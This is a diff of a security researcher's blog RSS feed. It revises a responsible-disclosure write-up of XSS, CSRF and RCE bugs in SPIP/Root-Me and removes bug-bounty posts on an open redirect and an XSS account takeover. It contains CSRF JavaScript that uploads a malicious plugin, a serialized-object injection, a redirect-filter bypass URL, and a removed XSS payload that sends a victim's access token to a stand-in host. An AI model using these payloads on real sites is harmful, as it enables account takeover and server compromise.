@@ -15,12 +15,13 @@
             <pubDate>Tue, 12 Jul 2022 13:02:46 +0200</pubDate>
             
             <guid>https://SpawnZii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/</guid>
-            <description>Introduction With a friend (cc Abyss Watcher) we decided to look for vulnerabilities on the SPIP CMS, Root-Me being based on spip we will be able to report vulnerabilities on the platform. In the first days we managed to find some bugs, XSS, CSRF and RCE.
-Environment Of course we did not our research directly on root me. So we set up a local spip environment.
- SPIP version 4.1.2 https://files.</description>
+            <description>Introduction Hello, I&amp;rsquo;m currently a first year student at ESNA and I&amp;rsquo;m passionate about web application security. This article describes the discovery of several critical vulnerabilities in the SPIP CMS and Root-Me.
+With a friend (cc Abyss Watcher) we decided to search for vulnerabilities on the SPIP/Root-Me. From the first days, we managed to find some bugs, XSS, CSRF and later we will discover a RCE.
+Environment Of course we did not our research directly on root me.</description>
             <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
-<p>With a friend (cc <a href="https://github.com/Abyss-W4tcher">Abyss Watcher</a>) we decided to look for vulnerabilities on the SPIP CMS, Root-Me being based on spip we will be able to report vulnerabilities on the platform.
-In the first days we managed to find some bugs, XSS, CSRF and RCE.</p>
+<p>Hello,
+I&rsquo;m currently a first year student at ESNA and I&rsquo;m passionate about web application security. This article describes the discovery of several critical vulnerabilities in the SPIP CMS and <a href="https://www.root-me.org/">Root-Me</a>.</p>
+<p>With a friend (cc <a href="https://github.com/Abyss-W4tcher">Abyss Watcher</a>) we decided to search for vulnerabilities on the SPIP/Root-Me. From the first days, we managed to find some bugs, XSS, CSRF and later we will discover a RCE.</p>
 <h2 id="environment">Environment</h2>
 <p>Of course we did not our research directly on root me. So we set up a local spip environment.</p>
 <ul>
@@ -64,9 +65,16 @@ $GLOBALS['filtrer_javascript'] = -1;
 <p>And on the administration interface.</p>
 <p><img src="/posts/rmrce/triggerxss.png" alt="form"></p>
 <h3 id="xss-to-csrf-to-rce-">XSS to CSRF to RCE ?</h3>
-<p>I had the idea to try to upload a php plugin with a csrf, for that we will look at a function of spip allowing an administrator to upload a plugin from a remote server.</p>
+<p>Now that we can run javascript several scenarios are possible via.</p>
+<ul>
+<li>Create a CSRF to take over the users&rsquo; accounts.</li>
+<li>Create a CSRF to elevate our privileges.</li>
+<li>Create a CSRF to upload a malicious plugin</li>
+</ul>
+<p>You guessed it, I chose the last option, for that we will look at a function of spip allowing an administrator to upload a plugin.</p>
 <p><img src="/posts/rmrce/manage.png" alt="form"></p>
-<p>Two tokens are passed in the request, they are found in the form.</p>
+<p>This function allows an administrator to upload a plugin in zip format from a remote server, the plugin will be unzip and stored at <code>/plugins/auto/</code>.
+By analyzing the upload request, we notice that two tokens are passed as parameters, fortunately for us, they do not change between two requests</p>
 <p><img src="/posts/rmrce/token.png" alt="form"></p>
 <p>It&rsquo;s time to build our payload !</p>
 <h3 id="evil-plugin-setup">Evil plugin setup.</h3>
@@ -92,7 +100,7 @@ if (xhr.readyState == 4) {
   token_arg = encodeURIComponent(token_arg);
   }
 }
-</code></pre><p>Now that we have our two tokens, we can build the request to upload a plugin.</p>
+</code></pre><p>Now that we have our two tokens, we can build the second request to upload a plugin.</p>
 <pre><code class="language-javascript=" data-lang="javascript=">function csrf_rce() {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
@@ -119,20 +127,26 @@ if (xhr.readyState == 4) {
 csrf_rce();
 </code></pre><p>We just have to encode our payload in base64 and paste it on the hyperlink.</p>
 <p><img src="/posts/rmrce/pldcsrf.png" alt="form"></p>
-<p>If a webmaster click on our link, the plugin will be upload on the web server.</p>
+<p>Now that our payload is ready, all we have to do is wait for an administrator to click on the link to download the plugin.</p>
+<p><img src="/posts/rmrce/o.gif" alt="form"></p>
 <p><img src="/posts/rmrce/apresclique.png" alt="form"></p>
 <p>We can go to our plugin to see the result.</p>
 <p><img src="/posts/rmrce/poc.png" alt="form"></p>
 <h2 id="-bug-2---on-est-bon-rien-a-faire-sounds-like-rce"># Bug 2 - &ldquo;On est bon, rien a faire&rdquo; sounds like RCE</h2>
-<p>After a few days Abyss watcher had the idea to watch the fix of an old vulnerability (cc <a href="https://twitter.com/TheLaluka?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Laluka</a>).</p>
+<p>After a few xss found, we wanted to think bigger and we gave ourselves the objective to find a RCE.</p>
+<p>A few days later Abyss watcher had the idea to watch the fix of an old vulnerability (cc <a href="https://twitter.com/TheLaluka?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Laluka</a>).</p>
+<p><img src="/posts/rmrce/patch.png" alt="form"></p>
+<h3 id="what-happens-in-the-patch-">What happens in the patch ?</h3>
+<p>Before the patch the <code>_oups</code> parameter was passed directly to the <code>$valeurs</code> array.
+Now <code>_oups</code> expects a serialized object encoded in base64.</p>
 <p><img src="/posts/rmrce/oupscommit.png" alt="form"></p>
-<p>The oups parameter therefore expects a serialized object encoded in base64.
-To debug  we can add a <code>print_r</code> of the variable <code>$valeurs</code> on the code.</p>
-<p><img src="/posts/rmrce/val.jpg" alt="form"></p>
+<p>To debug more simply we have added a <code>print_r</code> of the variable <code>$valeurs</code>.
+This allows us to see the result of our payload directly on the page.</p>
+<h3 id="its-time-for-a-bypass">It&rsquo;s time for a bypass</h3>
 <p>Now what happens if we put a simple sting like <strong>http://localhost/ecrire/?exec=article&amp;id_article=1&amp;_oups=notanobject</strong> on <code>_oups</code> parameter ?</p>
 <p><img src="/posts/rmrce/nv.png" alt="form"></p>
 <p>Nothing, <code>_oups</code> is empty.</p>
-<p>But now try to inject serialized object, <code>TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9</code>.</p>
+<p>But now try to inject serialized object, like : <code>TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9</code>.</p>
 <p><img src="/posts/rmrce/v.png" alt="form"></p>
 <p>The string is reflected several times in the source code.</p>
 <p><img src="/posts/rmrce/inj.png" alt="form"></p>
@@ -146,98 +160,42 @@ And if we try to reproduce the same thing on our injection. <strong><code>http:/
 <h2 id="small-explanations">Small explanations</h2>
 <p><img src="/posts/rmrce/mm.jpg" alt="form"></p>
 <p>SPIP uses skeletons, a kind of html template that is used to formalise the rendering of a page. The problem here is that once the skeleton is filled in, it is passed to a function that evaluates the page (evaluer_page.php). So as we inject into the skeleton, once passed into the function evaluate_page.php the php is interpreted.</p>
+<h2 id="timeline">Timeline</h2>
+<ul>
+<li>
+<p><strong>2022/07/05 at 3:38 PM</strong>: XSS/CSRF was discovert and report to SPIP.</p>
+</li>
+<li>
+<p><strong>2022/07/05 at 6:07 PM</strong>: First response of SPIP.</p>
+</li>
+<li>
+<p><strong>2022/07/12</strong> : New <a href="https://github.com/spip/SPIP/commit/d569096f346f54552ecf2b0f09c2880219288cb3">commit</a> on spip.</p>
+</li>
+<li>
+<p><strong>2022/07/12 at 1:13 AM</strong>: Report the RCE to spip.</p>
+</li>
+<li>
+<p><strong>2022/07/12 at 11:18 AM</strong>: First <a href="https://github.com/spip/SPIP/commit/31691fd689234b290db5f6c9cbae9aff06aca74a">commit</a> to fix the RCE.</p>
+</li>
+<li>
+<p><strong>2022/07/22</strong>: <a href="https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html">New security release</a>.</p>
+</li>
+</ul>
 <h2 id="conclusion">Conclusion</h2>
-<p>It was a great experience to share our research with Abyss Watcher. We are happy to have contributed to the security of SPIP and Root-Me.</p>
+<p>It was a great experience to share our research with <a href="https://github.com/Abyss-W4tcher">Abyss Watcher</a>. We are happy to have contributed to the security of SPIP and Root-Me. Many thanks to <a href="https://twitter.com/TheLaluka?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Laluka</a> and <a href="https://twitter.com/_worty">W0rty</a> for proofreading this article.</p>
 <p><img src="/posts/rmrce/sq.jpg" alt="form"></p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>[Bug Bounty] Open Redirect</title>
-            <link>https://SpawnZii.github.io/posts/2022/04/bug-bounty-open-redirect/</link>
-            <pubDate>Thu, 28 Apr 2022 13:52:15 +0200</pubDate>
-            
-            <guid>https://SpawnZii.github.io/posts/2022/04/bug-bounty-open-redirect/</guid>
-            <description>Introduction Hello, in this article I will detail the exploitation of a small bug that I found on a private program.
-The program has several scopes. One of the domains hosts a joomla. The site is static only a notification form is available.
-Exploitation So I intercepted the form&amp;rsquo;s request.Let&amp;rsquo;s assume that the target domain is www.spawnzii.com.
-POST /en/news HTTP/2 Host: www.spawnzii.com Cookie: cookieconsent_status=allow; aac5b3673d9cdeeefrf321e0c24cefe=h1uv6gsg0ucbpfgq249148vt7p User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.</description>
-            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
-<p>Hello, in this article I will detail the exploitation of a small bug that I found on a private program.</p>
-<p>The program has several scopes. One of the domains hosts a joomla. The site is static only a notification form is available.</p>
-<p><img src="/posts/opr/forms.png" alt="form"></p>
-<h2 id="exploitation">Exploitation</h2>
-<p>So I intercepted the form&rsquo;s request.<!-- raw HTML omitted -->
-Let&rsquo;s assume that the target domain is <a href="http://www.spawnzii.com">www.spawnzii.com</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">POST /en/news HTTP/2
-Host: www.spawnzii.com
-Cookie: cookieconsent_status<span style="color:#f92672">=</span>allow; aac5b3673d9cdeeefrf321e0c24cefe<span style="color:#f92672">=</span>h1uv6gsg0ucbpfgq249148vt7p
-User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:91.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
-Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: <span style="color:#ae81ff">227</span>
-Origin: https://www.spawnzii.com
-Referer: https://www.spawnzii.com/en/news
-Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Te: trailers
-
-user<span style="color:#f92672">[</span>name<span style="color:#f92672">]=</span>spz&amp;user<span style="color:#f92672">[</span>email<span style="color:#f92672">]=</span>spz@gmail.com&amp;ajax<span style="color:#f92672">=</span>0&amp;acy_source<span style="color:#f92672">=</span>module_396&amp;ctrl<span style="color:#f92672">=</span>sub&amp;task<span style="color:#f92672">=</span>optin&amp;redirect<span style="color:#f92672">=</span>https://www.spawnzii.com/en/news&amp;redirectunsub<span style="color:#f92672">=</span>https://www.spawnzii.com/en/news&amp;option<span style="color:#f92672">=</span>com_acymailing&amp;hiddenlists<span style="color:#f92672">=</span>1&amp;acyformname<span style="color:#f92672">=</span>formAcymailing2321
-</code></pre></div><p>In this request there are two interesting parameters that seem to redirect to a page after joining the notification.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&amp;redirect<span style="color:#f92672">=</span>https://www.spawnzii.com/en/news&amp;redirectunsub<span style="color:#f92672">=</span>https://www.spawnzii.com/en/news
-</code></pre></div><p>if we try to change the value of these two parameters by <strong><a href="http://www.google.com">www.google.com</a></strong>, we get an error message saying that the domain is not allowed.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">HTTP/2 200 OK
-Server: nginx
-Date: Wed, 16 Mar 2022 13:34:25 GMT
-Content-Type: text/html; charset=UTF-8
-Content-Length: 414
-X-Content-Type-Options: nosniff
-Vary: Accept-Encoding
-X-Varnish: 25024599
-Age: 0
-Accept-Ranges: bytes
-
-&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;This redirect url is not allowed, you should change the &#34;Allowed domains for the redirection via the module&#34; parameter from the AcyMailing configuration page to &#34;spawnzii.com.au|mail.spawnzii.com.au|fr.SpawnZii.org|SpawnZiifr.com|SpawnZiiprodv2.corp.fr|google.com&#34; to allow it or set it to &#34;all&#34; to allow all urls&#39;</span>); window.<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">go</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><h2 id="filter-bypass">Filter Bypass</h2>
-<p>We can perform a redirection by making the browser believe that it is going to connect to another site using the <em>@</em>.</p>
-<p>I replace the value of the two parameters by : <em><code>https://www.spawnzii.com@www.google.com</code></em>.</p>
-<p>And we get a redirection to <a href="http://www.google.com">www.google.com</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">HTTP/2 <span style="color:#ae81ff">303</span> See Other
-Server: nginx
-Date: Wed, <span style="color:#ae81ff">16</span> Mar <span style="color:#ae81ff">2022</span> 14:22:10 GMT
-Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
-Content-Length: <span style="color:#ae81ff">0</span>
-Cache-Control: public, max-age<span style="color:#f92672">=</span>3600, stale-while-revalidate<span style="color:#f92672">=</span>7200, stale-if-error<span style="color:#f92672">=</span><span style="color:#ae81ff">18000</span>
-Expires: Wed, <span style="color:#ae81ff">16</span> Mar <span style="color:#ae81ff">2022</span> 15:22:10 GMT
-Pragma: public
-X-Logged-In: False
-X-Content-Type-Options: nosniff
-Location: https://www.spawnzii.com@www.google.com
-X-Varnish: <span style="color:#ae81ff">24047579</span>
-Age: <span style="color:#ae81ff">0</span>
-</code></pre></div><h2 id="poc">PoC</h2>
-<p>Now we have a redirect, we need to be able to send it to a user (remember we modify a POST request). To do this I simply changed the type of the request to GET.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET /en/news?user<span style="color:#f92672">[</span>name<span style="color:#f92672">]=</span>rezq&amp;user<span style="color:#f92672">[</span>email<span style="color:#f92672">]=</span>spz@gmail.com&amp;ajax<span style="color:#f92672">=</span>0&amp;acy_source<span style="color:#f92672">=</span>module_396&amp;ctrl<span style="color:#f92672">=</span>sub&amp;task<span style="color:#f92672">=</span>optin&amp;redirect<span style="color:#f92672">=</span>https://www.spawnzii.com@www.google.com&amp;redirectunsub<span style="color:#f92672">=</span>https://www.spawnzii.com@www.google.com&amp;option<span style="color:#f92672">=</span>com_acymailing&amp;hiddenlists<span style="color:#f92672">=</span>1&amp;acyformname<span style="color:#f92672">=</span>formAcymailing44291 HTTP/2
-Host: www.spawnzii.com
-Cookie: cookieconsent_status<span style="color:#f92672">=</span>allow; aac5b3673d9cdeeeda1df9804cefe<span style="color:#f92672">=</span>h1uv6gsg0u76pfgqh09148vt7p
-User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:91.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
-Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
-Accept-Encoding: gzip, deflate
-Origin: https://www.spawnzii.com
-Referer: https://www.spawnzii.com/en/news
-Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Te: trailers
-</code></pre></div><p>Payload : <em><a href="https://www.spawnzii.com/en/news?user%5Bname%5D=spz&amp;user%5Bemail%5D=spz@gmail.com&amp;ajax=0&amp;acy_source=module_396&amp;ctrl=sub&amp;task=optin&amp;redirect=https://www.spawnzii.com@www.google.com&amp;redirectunsub=https://www.spawnzii.com@www.google.com&amp;option=com_acymailing&amp;hiddenlists=1&amp;acyformname=formAcymailing44201">https://www.spawnzii.com/en/news?user[name]=spz&amp;user[email]=spz@gmail.com&amp;ajax=0&amp;acy_source=module_396&amp;ctrl=sub&amp;task=optin&amp;redirect=https://www.spawnzii.com@www.google.com&amp;redirectunsub=https://www.spawnzii.com@www.google.com&amp;option=com_acymailing&amp;hiddenlists=1&amp;acyformname=formAcymailing44201</a></em></p>
+<h2 id="references">References</h2>
+<ul>
+<li>
+<p><strong>Abyss Watcher Article</strong>: <a href="https://github.com/Abyss-W4tcher/ab4yss-writeups/tree/master/SPIP%204.1.2%20Vulnerabilities">https://github.com/Abyss-W4tcher/ab4yss-writeups/tree/master/SPIP%204.1.2%20Vulnerabilities</a></p>
+</li>
+<li>
+<p><strong>Laluka&rsquo;s RCE</strong> : <a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/">https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/</a></p>
+</li>
+<li>
+<p><strong>SPIP release</strong> : <a href="https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html">https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html</a></p>
+</li>
+</ul>
 ]]></content>
         </item>
         
@@ -341,62 +299,6 @@ On comprend que le flag est pipe vers notify.</p>
 <p><img src="/posts/bgk/provider.png" alt="form"></p>
 <p>On attend que le crontab soit exécuté.</p>
 <p><img src="/posts/bgk/flag.png" alt="form"></p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>[Bug Bounty] XSS to Account Takeover</title>
-            <link>https://SpawnZii.github.io/posts/2022/03/bug-bounty-xss-to-account-takeover/</link>
-            <pubDate>Mon, 28 Mar 2022 18:46:31 +0200</pubDate>
-            
-            <guid>https://SpawnZii.github.io/posts/2022/03/bug-bounty-xss-to-account-takeover/</guid>
-            <description>Introduction Hello, in this article I will detail the exploitation of a bug that I found on a private program on Yes We Hack.
-I started to list the web application. A feature of the application allows the user to plublish an article. I tried several xss payloads but as the program is quite old all the inputes were correctly filtered
-It is possible to publish an article from a url, by passing the url of an article the web application will preload the title and content of the article.</description>
-            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
-<p>Hello, in this article I will detail the exploitation of a bug that I found on a private program on Yes We Hack.</p>
-<p>I started to list the web application. A feature of the application allows the user to plublish an article. I tried several xss payloads but as the program is quite old all the inputes were correctly filtered</p>
-<p><img src="/posts/crsf/upload.jpg" alt="form"></p>
-<p>It is possible to publish an article from a url, by passing the url of an article the web application will preload the title and content of the article. So I put the ip of my vps.</p>
-<p><img src="/posts/crsf/url.png" alt="form"></p>
-<p>Server logs (I already test for <strong>SSRF</strong> but it was correctly filtered)</p>
-<p><img src="/posts/crsf/srvtrace.jpg" alt="form"></p>
-<p>As you can see the title of my web server is preloaded result.</p>
-<p><img src="/posts/crsf/spzwhere.jpg" alt="form"></p>
-<h2 id="exploitation">Exploitation</h2>
-<p>So I had the idea to put an xss payload in the title of my web server.</p>
-<p><img src="/posts/crsf/pldxss.png" alt="form"></p>
-<p>Now we have an stored xss. If a user clicks on the article the <strong>XSS</strong> will be triggered.</p>
-<p><img src="/posts/crsf/xss.jpg" alt="form"></p>
-<h2 id="elevate-the-impact">Elevate the impact</h2>
-<p>I will try to create a <strong>CSRF</strong> to change the user&rsquo;s email</p>
-<h3 id="step-1">Step 1</h3>
-<p>First we will look at what the mail change request looks like by going to our settings and changing our mail.</p>
-<p><img src="/posts/crsf/email.jpg" alt="form"></p>
-<p>I enter a different email and intercept the request with Burp.</p>
-<p><img src="/posts/crsf/burp.jpg" alt="form"></p>
-<p>The request must contain several headers, an email field with its value and the access token.
-Our access token is stored locally.</p>
-<p>You can get it with this piece of js code :</p>
-<pre><code class="language-javascript=" data-lang="javascript=">Object.keys(localStorage).some(function (key) {
-  if(/access/.test(key)) console.log(localStorage[key])
-});
-</code></pre><p>The final payload :</p>
-<pre><code class="language-javascript=" data-lang="javascript=">&lt;img/src/onerror='Object.keys(localStorage).some(function (key) { 
-  if(/access/.test(key)){ var data = {&quot;AccessToken&quot;:localStorage[key],&quot;UserAttributes&quot;:[{&quot;Name&quot;:&quot;email&quot;,&quot;Value&quot;:&quot;fakeemailattacker@yopmail.com&quot;}]}; 
-  var xhr = new XMLHttpRequest(); 
-  xhr.open(&quot;POST&quot;,&quot;https://fakedomain.com/&quot;,true); 
-  xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-amz-json-1.1&quot;); 
-  xhr.setRequestHeader(&quot;XXXXXCUSTOMHEADER&quot;,&quot;XXXXXCUSTOMHEADER&quot;); 
-  xhr.setRequestHeader(&quot;XXXXXCUSTOMHEADER&quot;,&quot;XXXXXCUSTOMHEADER&quot;); 
-  xhr.send(JSON.stringify(data)); 
-  return;
-  }});'&gt;
-</code></pre><p>We place the payload in the title of our web server and check our mailbox.</p>
-<p><img src="/posts/crsf/pldfinal.jpg" alt="form"></p>
-<p>PoC:</p>
-<p><img src="/posts/crsf/poc.jpg" alt="form"></p>
-<p>Unfortunately this is a duplicate :(</p>
 ]]></content>
         </item>
         
